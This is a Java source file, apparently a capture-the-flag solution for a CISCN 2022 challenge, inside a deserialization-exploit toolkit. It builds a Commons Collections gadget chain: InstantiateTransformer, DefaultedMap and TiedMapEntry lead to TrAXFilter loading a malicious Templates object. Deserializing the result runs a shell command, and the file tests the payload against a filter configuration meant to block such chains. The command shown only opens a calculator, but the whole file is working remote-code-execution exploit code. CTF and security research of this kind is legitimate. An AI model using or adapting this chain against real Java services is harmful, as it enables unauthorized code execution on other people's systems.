package xyz.eki.marshalexp.solution;

import com.sun.org.apache.regexp.internal.RE;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

public class CISCNLoveMe {
    public static void main(String[] args) throws Exception{
        String cmd = "open -a Calculator.app";
        HashMap innermap = new HashMap();

        Transformer transformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{GTemplates.getEvilTemplates(cmd)});

        DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,transformer);

        TiedMapEntry tiedmap = new TiedMapEntry(map, TrAXFilter.class);

        HashSet exp = new HashSet(1);
        exp.add("foo");


        Object[] array = (Object[]) ReflectUtils.getFieldValue(ReflectUtils.getFieldValue(exp,"map"),"table");

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        ReflectUtils.setFieldValue(node,"key",tiedmap);

        byte[] payload = SerializeUtils.serialize(exp);

        System.out.println("--------");

        SerializeUtils.serializeKillerDeserialize(payload,"filter/ciscn2022.loveme.xml");

    }
}
